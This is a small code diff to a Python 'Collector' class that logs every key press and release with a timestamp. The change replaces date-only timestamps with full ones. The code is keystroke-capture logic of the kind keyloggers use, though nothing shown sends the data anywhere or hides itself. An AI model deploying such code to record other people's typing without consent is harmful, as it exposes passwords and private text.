@@ -9,15 +9,15 @@ class Collector:
 
     def on_press(self, key):
         try:
-            self.inject_to_log(f"[*] Pressed: {key.char} at: {datetime.today().strftime('%Y-%m-%d')}")
+            self.inject_to_log(f"[*] Pressed: {key.char} at: {datetime.now()}")
         except AttributeError:
-            self.inject_to_log(f"[*] Pressed: {key} at: {datetime.today().strftime('%Y-%m-%d')}")
+            self.inject_to_log(f"[*] Pressed: {key} at: {datetime.now()}")
 
     def on_release(self, key):
         try:
-            self.inject_to_log(f"[*] Released: {key.char} at: {datetime.today().strftime('%Y-%m-%d')}")
+            self.inject_to_log(f"[*] Released: {key.char} at: {datetime.now()}")
         except AttributeError:
-            self.inject_to_log(f"[*] Released: {key} at: {datetime.today().strftime('%Y-%m-%d')}")
+            self.inject_to_log(f"[*] Released: {key} at: {datetime.now()}")
         if key == keyboard.Key.esc:
             return False
     
